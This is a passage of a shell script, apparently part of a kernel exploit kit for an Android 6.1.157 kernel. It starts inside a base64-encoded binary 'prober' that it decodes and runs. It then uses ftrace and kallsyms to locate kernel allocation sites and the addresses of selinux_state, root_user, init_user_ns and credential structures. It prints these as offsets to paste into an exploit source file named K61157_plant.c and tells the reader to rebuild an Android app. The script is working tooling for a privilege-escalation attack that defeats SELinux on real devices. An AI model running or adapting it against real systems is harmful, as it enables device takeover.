AAMgBAAEAAAAAyAEAAAAAAAAcAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABcAAAABAAAAAgAAAAAAAADoAQABAAAAAOgBAAAAAAAATAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAhAAAAAQAAAAYAAAAAAAAANAIBAQAAAAA0AgAAAAAAAPAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAJwAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAJAMAAAAAAADCAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAADIAAAABAAAAAAAAAAAAAAAAAAAAAAAAAOYFAAAAAAAAPwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAlBwAAAAAAACEEAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAATAAAAAEAAAAwAAAAAAAAAAAAAAAAAAAARgsAAAAAAACVAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAFcAAAABAAAAMAAAAAAAAAAAAAAAAAAAANsLAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAABgAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAADDAAAAAAAAJQAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAbAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAmAwAAAAAAABoAQAAAAAAAA0AAAAOAAAACAAAAAAAAAAYAAAAAAAAAHQAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAAAAAhgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAB+AAAAAwAAAAAAAAAAAAAAAAAAAAAAAACGDgAAAAAAAEIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA' | base64 -d > "$WORK/x6873_probe" 2>/dev/null || die "prober decode failed"
        chmod 755 "$WORK/x6873_probe"
        PROBE_BIN="$WORK/x6873_probe"
    fi

    printf '%s' 0 > "$TR/tracing_on" 2>/dev/null
    echo > "$TR/trace" 2>/dev/null
    printf '%s' 1 > "$EVT"
    [ -n "$T_E2_SAVED" ] && printf '%s' 1 > "$EVT_NODE" 2>/dev/null

    "$PROBE_BIN" > "$WORK/probe.out" 2>&1 &
    P=$!
    wait "$P"
    PRC=$?

    printf '%s' 0 > "$EVT"
    [ -n "$T_E2_SAVED" ] && printf '%s' 0 > "$EVT_NODE" 2>/dev/null
    printf '%s' "${T_ON_SAVED:-0}" > "$TR/tracing_on" 2>/dev/null

    if grep -q PROBE_TIMER_OK "$WORK/probe.out" 2>/dev/null && \
       grep -q PROBE_DONE "$WORK/probe.out" 2>/dev/null; then
        PROBER_OK=1
        say "[ok] prober completed (exit $PRC)"
    else
        say "[warn] prober failed (exit $PRC) — output follows (it prints no errno; known limitation)"
        if [ -s "$WORK/probe.out" ]; then
            n=0
            while IFS= read -r l; do
                say "  | $l"
                n=$(( n + 1 ))
                [ "$n" -ge 15 ] && break
            done < "$WORK/probe.out"
        else
            say "  | (probe.out empty — exec denied: noexec mount or SELinux)"
        fi
    fi

    collect_recs
    NREC=$COLLECTED

    # (b) passive window when records are missing: forced forks + 3 s
    if [ "$NREC" -lt 2 ] && command -v sleep >/dev/null 2>&1; then
        say "[info] passive trace window (3 s, forced fork churn) — no exploit code runs"
        printf '%s' 512 > "$TR/buffer_size_kb" 2>/dev/null || \
            say "[warn] could not raise buffer_size_kb (using current size)"
        printf '%s' 0 > "$TR/tracing_on" 2>/dev/null
        echo > "$TR/trace" 2>/dev/null
        printf '%s' 1 > "$EVT"
        [ -n "$T_E2_SAVED" ] && printf '%s' 1 > "$EVT_NODE" 2>/dev/null
        printf '%s' 1 > "$TR/tracing_on" 2>/dev/null
        # fork churn: every spawn goes through dup_task_struct
        i=0
        while [ "$i" -lt 8 ]; do
            ( : ) 2>/dev/null
            ls / >/dev/null 2>&1
            i=$(( i + 1 ))
        done
        sleep 3
        printf '%s' 0 > "$TR/tracing_on" 2>/dev/null
        printf '%s' 0 > "$EVT"
        [ -n "$T_E2_SAVED" ] && printf '%s' 0 > "$EVT_NODE" 2>/dev/null
        [ -n "$T_BUF_SAVED" ] && printf '%s' "$T_BUF_SAVED" > "$TR/buffer_size_kb" 2>/dev/null
        collect_recs
        [ "$COLLECTED" -gt "$NREC" ] && NREC=$COLLECTED
    fi

    trace_restore
fi

# resolve trace tokens
TRACE_TIMER_OFF=""; TRACE_TASK_OFF=""
if [ -n "$TIMER_TOKEN" ]; then
    if [ "$TIMER_TOKEN" = "ZEROED" ]; then
        say "[warn] trace timer call_site addresses are zeroed (tracefs kptr policy) — trace path unavailable for this site"
    else
        TRACE_TIMER_OFF=$(resolve_token "$TIMER_TOKEN") || {
            TRACE_TIMER_OFF=""
            say "[warn] timer call_site token '$TIMER_TOKEN' did not resolve — trace path unused for this site"
        }
    fi
fi
if [ -n "$TASK_TOKEN" ]; then
    if [ "$TASK_TOKEN" = "ZEROED" ]; then
        say "[warn] trace task call_site addresses are zeroed (tracefs kptr policy) — trace path unavailable for this site"
    else
        TRACE_TASK_OFF=$(resolve_token "$TASK_TOKEN") || {
            TRACE_TASK_OFF=""
            say "[warn] task call_site token '$TASK_TOKEN' did not resolve — trace path unused for this site"
        }
    fi
fi

# --------------------------------------- 6. site resolution (per site)
# enclosing function of a linked offset, from the copy (window grep:
# the two 64 KiB blocks below the site; the loop keeps al <= site)
enclosing_of() { # $1 = site linked offset -> "name off" or fails
    site=$1
    p1=$(rt_hex16 "$site" | head -c 12)
    p2=$(rt_hex16 $(( site - 65536 )) | head -c 12)
    _got="$(grep -E "^($p1|$p2)" "$KSCOPY" 2>/dev/null)" || _got=""
    best_a=-1; best_n=""
    while read -r a t n rest; do
        case "$t" in
        t|T) ;;
        *) continue ;;
        esac
        al=$(( 0x$(addr_lo "$a") - SLIDE - BASE_LO ))
        [ "$al" -le "$site" ] || continue
        [ "$al" -gt "$best_a" ] || continue
        best_a=$al; best_n=$n
    done <<EOF
$_got
EOF
    [ -n "$best_n" ] || return 1
    echo "$best_n $(( site - best_a ))"
    return 0
}

timer_family() { case "$1" in
    *timer_create*|*posix_timer*|*alloc_posix*) return 0 ;;
    esac; return 1; }
copy_family() { case "$1" in
    *dup_task*|*copy_process*|*alloc_task*|*task_struct*) return 0 ;;
    esac; return 1; }

# build the grep window pattern for all in-text candidates of both
# low21s (each candidate contributes its 64 KiB block + the one below)
CAND_RE=""
build_window_re() {
    for pair in "T $BAKED_TIMER_LOW21" "C $BAKED_COPY_LOW21"; do
        set -- $pair
        p=$1; L=$2
        k=0
        while [ "$k" -le 40 ]; do
            c=$(( L + k * 2097152 ))
            if [ "$c" -ge "$TEXT_LO" ] && [ "$c" -lt "$TEXT_HI" ]; then
                CAND_RE="$CAND_RE|$(rt_hex16 "$c" | head -c 12)"
                CAND_RE="$CAND_RE|$(rt_hex16 $(( c - 65536 )) | head -c 12)"
            fi
            k=$(( k + 1 ))
        done
    done
    CAND_RE="${CAND_RE#|}"
    return 0
}

# scan the (small) window grep output; per candidate k, track the last
# text symbol within 64 KiB below the candidate (kallsyms is ascending,
# so the final value is the enclosing symbol)
scan_candidates() {
    WIN=65536
    if [ -n "$CAND_RE" ]; then
        _got="$(grep -E "^($CAND_RE)" "$KSCOPY" 2>/dev/null)" || _got=""
    else
        _got=""
    fi
    while read -r a t n rest; do
        case "$t" in
        t|T) ;;
        *) continue ;;
        esac
        al=$(( 0x$(addr_lo "$a") - SLIDE - BASE_LO ))
        [ "$al" -ge 0 ] || continue
        [ "$al" -lt 88080384 ] || continue
        d=$(( al - BAKED_TIMER_LOW21 ))
        if [ "$d" -ge $(( 0 - WIN )) ] && [ "$d" -le 0 ]; then
            ENC_T_0=$al; ENC_TN_0=$n
        elif [ "$d" -gt 0 ]; then
            k=$(( ( d + 2097151 ) / 2097152 ))
            if [ "$k" -le 40 ]; then
                c=$(( BAKED_TIMER_LOW21 + k * 2097152 ))
                if [ $(( c - al )) -le $WIN ]; then
                    eval "ENC_T_$k=$al ENC_TN_$k=\$n"
                fi
            fi
        fi
        d=$(( al - BAKED_COPY_LOW21 ))
        if [ "$d" -ge $(( 0 - WIN )) ] && [ "$d" -le 0 ]; then
            ENC_C_0=$al; ENC_CN_0=$n
        elif [ "$d" -gt 0 ]; then
            k=$(( ( d + 2097151 ) / 2097152 ))
            if [ "$k" -le 40 ]; then
                c=$(( BAKED_COPY_LOW21 + k * 2097152 ))
                if [ $(( c - al )) -le $WIN ]; then
                    eval "ENC_C_$k=$al ENC_CN_$k=\$n"
                fi
            fi
        fi
    done <<EOF
$_got
EOF
    return 0
}

# dump_candidates LOW21 PREFIX: every in-text candidate + enclosing —
# the offline-analysis artifact printed on abort
dump_candidates() { # $1 = low21, $2 = var prefix (T or C)
    L=$1; p=$2
    k=0
    while [ "$k" -le 40 ]; do
        c=$(( L + k * 2097152 ))
        if [ "$c" -ge "$TEXT_LO" ] && [ "$c" -lt "$TEXT_HI" ]; then
            eval "ea=\${ENC_${p}_$k:-}"
            if [ -n "$ea" ]; then
                eval "en=\${ENC_${p}N_$k}"
                say "  cand k=$k $(hexaddr "$c") enclosing ${en}$(sxoff $(( c - ea )))"
            else
                say "  cand k=$k $(hexaddr "$c") enclosing (no text symbol within 64 KiB below)"
            fi
        fi
        k=$(( k + 1 ))
    done
    return 0
}

# fallback_site LOW21 PREFIX FAMILYFN -> "offset name off_in_fn" on
# stdout when EXACTLY ONE in-text candidate's enclosing symbol matches
# the family; rc 1 otherwise (none or ambiguous)
fallback_site() { # $1 = low21, $2 = prefix, $3 = family fn
    L=$1; p=$2; fn=$3
    found=0; fo=0; fnm=""; foff=0
    k=0
    while [ "$k" -le 40 ]; do
        c=$(( L + k * 2097152 ))
        [ "$c" -ge "$TEXT_LO" ] && [ "$c" -lt "$TEXT_HI" ] || { k=$(( k + 1 )); continue; }
        eval "ea=\${ENC_${p}_$k:-}"
        [ -n "$ea" ] || { k=$(( k + 1 )); continue; }
        eval "en=\${ENC_${p}N_$k}"
        if "$fn" "$en"; then
            found=$(( found + 1 ))
            fo=$c; fnm=$en; foff=$(( c - ea ))
        fi
        k=$(( k + 1 ))
    done
    [ "$found" = "1" ] || return 1
    echo "$fo $fnm $foff"
    return 0
}

NEED_FALLBACK=0
[ -z "$TRACE_TIMER_OFF" ] && NEED_FALLBACK=1
[ -z "$TRACE_TASK_OFF" ] && NEED_FALLBACK=1
FB_TIMER=""; FB_TASK=""
if [ "$NEED_FALLBACK" = "1" ]; then
    say "[info] kallsyms enclosing-function fallback (windowed scan of the copy)"
    build_window_re
    scan_candidates
    if [ -z "$TRACE_TIMER_OFF" ]; then
        FB_TIMER=$(fallback_site "$BAKED_TIMER_LOW21" T timer_family) || FB_TIMER=""
    fi
    if [ -z "$TRACE_TASK_OFF" ]; then
        FB_TASK=$(fallback_site "$BAKED_COPY_LOW21" C copy_family) || FB_TASK=""
    fi
fi

# fatal gates (in the parent, never inside a substitution): trace low21
# must match the bundle (build identity); trace and fallback must agree
if [ -n "$TRACE_TIMER_OFF" ]; then
    tl=$(( TRACE_TIMER_OFF & 0x1fffff ))
    if [ "$tl" -ne "$BAKED_TIMER_LOW21" ]; then
        die "timer site from the trace ($(hexaddr "$TRACE_TIMER_OFF"), low21 0x$(printf '%x' "$tl")) does not carry the bundle low21 0x$(printf '%x' "$BAKED_TIMER_LOW21") — different kernel build than the 2026-11-12 bundle?"
    fi
    if [ -n "$FB_TIMER" ]; then
        [ "${FB_TIMER%% *}" = "$TRACE_TIMER_OFF" ] || \
            die "timer site inconsistency: trace $(hexaddr "$TRACE_TIMER_OFF") vs kallsyms fallback $(hexaddr "${FB_TIMER%% *}") — send back the full console"
    fi
fi
if [ -n "$TRACE_TASK_OFF" ]; then
    tl=$(( TRACE_TASK_OFF & 0x1fffff ))
    if [ "$tl" -ne "$BAKED_COPY_LOW21" ]; then
        die "copy site from the trace ($(hexaddr "$TRACE_TASK_OFF"), low21 0x$(printf '%x' "$tl")) does not carry the bundle low21 0x$(printf '%x' "$BAKED_COPY_LOW21") — different kernel build than the 2026-11-12 bundle?"
    fi
    if [ -n "$FB_TASK" ]; then
        [ "${FB_TASK%% *}" = "$TRACE_TASK_OFF" ] || \
            die "copy site inconsistency: trace $(hexaddr "$TRACE_TASK_OFF") vs kallsyms fallback $(hexaddr "${FB_TASK%% *}") — send back the full console"
    fi
fi

# per-site resolution: trace primary, family fallback
if [ -n "$TRACE_TIMER_OFF" ]; then
    OFF_TIMER=$TRACE_TIMER_OFF
    SRC_TIMER=trace
    enc=$(enclosing_of "$OFF_TIMER") || enc="unknown 0"
    ENC_TIMER="${enc%% *}"
    eoff=${enc#* }
    [ "$eoff" = "$enc" ] && eoff=0
    ENC_TIMER="$ENC_TIMER$(sxoff "$eoff")"
elif [ -n "$FB_TIMER" ]; then
    OFF_TIMER=${FB_TIMER%% *}
    rest=${FB_TIMER#* }
    SRC_TIMER=family
    ENC_TIMER=${rest%% *}
    eoff=${rest#* }
    ENC_TIMER="$ENC_TIMER$(sxoff "$eoff")"
else
    say "ERROR: cannot resolve the timer call site (no usable trace record, no unique family candidate)."
    say "Candidates (low21 0x$(printf '%x' "$BAKED_TIMER_LOW21")), enclosing symbols from kallsyms:"
    dump_candidates "$BAKED_TIMER_LOW21" T
    die "timer site unresolved — send back the full console output for offline analysis"
fi
if [ -n "$TRACE_TASK_OFF" ]; then
    OFF_TASK=$TRACE_TASK_OFF
    SRC_TASK=trace
    enc=$(enclosing_of "$OFF_TASK") || enc="unknown 0"
    ENC_TASK="${enc%% *}"
    eoff=${enc#* }
    [ "$eoff" = "$enc" ] && eoff=0
    ENC_TASK="$ENC_TASK$(sxoff "$eoff")"
elif [ -n "$FB_TASK" ]; then
    OFF_TASK=${FB_TASK%% *}
    rest=${FB_TASK#* }
    SRC_TASK=family
    ENC_TASK=${rest%% *}
    eoff=${rest#* }
    ENC_TASK="$ENC_TASK$(sxoff "$eoff")"
else
    say "ERROR: cannot resolve the copy call site (no usable trace record, no unique family candidate)."
    say "Candidates (low21 0x$(printf '%x' "$BAKED_COPY_LOW21")), enclosing symbols from kallsyms:"
    dump_candidates "$BAKED_COPY_LOW21" C
    die "copy site unresolved — send back the full console output for offline analysis"
fi

LOW21_TIMER=$(( OFF_TIMER & 0x1fffff ))
LOW21_TASK=$(( OFF_TASK & 0x1fffff ))
[ "$LOW21_TIMER" -eq "$BAKED_TIMER_LOW21" ] || die "internal: timer low21 lost ($LOW21_TIMER)"
[ "$LOW21_TASK" -eq "$BAKED_COPY_LOW21" ] || die "internal: copy low21 lost ($LOW21_TASK)"
say "[ok] timer site : $(hexaddr "$OFF_TIMER") (low21 0x$(printf '%x' "$LOW21_TIMER") matches bundle; enclosing ${ENC_TIMER}; source $SRC_TIMER)"
say "[ok] copy site  : $(hexaddr "$OFF_TASK") (low21 0x$(printf '%x' "$LOW21_TASK") matches bundle; enclosing ${ENC_TASK}; source $SRC_TASK)"

# fresh vs baked padded sizes (only meaningful with a fresh record)
if [ -n "$TRACE_TIMER_OFF" ] && [ -n "$TIMER_ALLOC_V" ]; then
    is_int "$TIMER_ALLOC_V" || die "trace timer bytes_alloc missing - report this output"
    [ "$TIMER_ALLOC_V" = "$BAKED_TIMER_ALLOC" ] || \
        die "fresh timer bytes_alloc $TIMER_ALLOC_V != bundle 0x140 — same release but different slab geometry is inconsistent, report this"
fi
if [ -n "$TRACE_TASK_OFF" ] && [ -n "$TASK_ALLOC_V" ]; then
    is_int "$TASK_ALLOC_V" || die "trace task bytes_alloc missing - report this output"
    [ "$TASK_ALLOC_V" = "$BAKED_TASK_ALLOC" ] || \
        die "fresh task bytes_alloc $TASK_ALLOC_V != bundle 0x12c0 — same release but different slab geometry is inconsistent, report this"
fi
if [ -n "$TRACE_TIMER_OFF" ]; then
    say "[ok] fresh timer bytes_alloc matches the bundle (0x140)"
    TIMER_ALLOC_OUT=$TIMER_ALLOC_V
else
    say "[warn] timer padded size from the baked bundle value (no fresh trace record)"
    TIMER_ALLOC_OUT=$BAKED_TIMER_ALLOC
fi
if [ -n "$TRACE_TASK_OFF" ]; then
    say "[ok] fresh task bytes_alloc matches the bundle (0x12c0)"
    TASK_ALLOC_OUT=$TASK_ALLOC_V
else
    say "[warn] task padded size from the baked bundle value (no fresh trace record)"
    TASK_ALLOC_OUT=$BAKED_TASK_ALLOC
fi

# ------------------------------------------------------------- 7. output
say ""
say "================ paste into exploit/src/K61157_plant.c (profile row) ==============="
say "    {"
say "        \"6.1.157-android14-11-ga8b0b542991e-ab15601211\","
say "        $(hexaddr "$OFF_TIMER")ULL,  /* timer_site    (source: $SRC_TIMER, enclosing ${ENC_TIMER}) */"
say "        $(printf '0x%x' "$LOW21_TIMER")ULL,  /* timer_low21   (bundle-baked, re-verified) */"
say "        $(printf '0x%x' "$LOW21_TASK")ULL,  /* copy_low21    (bundle-baked, re-verified) */"
say "        0xffffffc08225b827ULL, /* selinux_state (prefilled, measured) */"
say "        $(emit_sym panic_on_warn)ULL,  /* panic_on_warn */"
say "        $(emit_sym root_user)ULL,  /* root_user     */"
say "        $(emit_sym init_user_ns)ULL,  /* init_user_ns  */"
say "        $(emit_sym init_ucounts)ULL,  /* init_ucounts  */"
say "        $(emit_sym init_groups)ULL,  /* init_groups   */"
say "    },"
say ""
say "================ paste into plant_core.inc (X6873_61157 branch) ==================="
say "#define TIMER_REQ  0x$(printf '%x' "$BAKED_TIMER_REQ")ULL   /* slabinfo objsize: $SZ_TIMER */"
say "#define TIMER_ALLOC 0x$(printf '%x' "$TIMER_ALLOC_OUT")ULL"
say "#define CRED_REQ  0x$(printf '%x' "$BAKED_CRED_REQ")ULL   /* slabinfo objsize: $SZ_CRED */"
say "#define CRED_ALLOC 0x$(printf '%x' "$BAKED_CRED_ALLOC")ULL"
say "#define TASK_ALLOC_BYTES 0x$(printf '%x' "$BAKED_TASK_REQ")ULL   /* slabinfo objsize: $SZ_TASK */"
say "#define TASK_ALLOC_PADDED 0x$(printf '%x' "$TASK_ALLOC_OUT")ULL"
say ""
say "Then rebuild: ./exploit/build-all.sh && (cd app && ./gradlew :app:assembleRelease)"
say "The pending guard in K61157_plant.c clears itself once every field is non-zero."

KEEP=0
[ "$PROBER_OK" = "0" ] && [ "$TRACE_AVAILABLE" = "1" ] && KEEP=1
[ "$NEED_FALLBACK" = "1" ] && KEEP=1
if [ "$KEEP" = "1" ]; then
    say "[done] workdir KEPT for inspection: $WORK (kallsyms copy + probe.out; delete manually)"
else
    rm -rf "$WORK"
    say "[done] workdir cleaned"
fi
